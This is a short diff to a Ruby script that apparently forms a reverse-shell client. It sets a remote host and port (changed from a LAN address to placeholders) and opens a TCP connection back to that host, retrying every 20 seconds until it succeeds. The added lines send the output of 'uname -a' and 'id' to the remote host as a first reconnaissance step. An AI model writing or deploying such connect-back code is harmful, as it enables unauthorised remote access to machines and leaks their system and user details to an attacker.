@@ -4,14 +4,15 @@ require 'socket'
 require 'open3'
 
 #Set the Remote Host IP
-RHOST = "192.168.1.10" 
+RHOST = "x.x.x.x" 
 #Set the Remote Host Port
-PORT = "6667"
+PORT = "xxxxx"
 
 #Tries to connect every 20 sec until it connects.
 begin
 sock = TCPSocket.new "#{RHOST}", "#{PORT}"
-sock.puts "We are connected!"
+sock.puts "We are connected!\n\n"
+sock.puts `uname -a; echo; id`
 rescue
   sleep 20
   retry
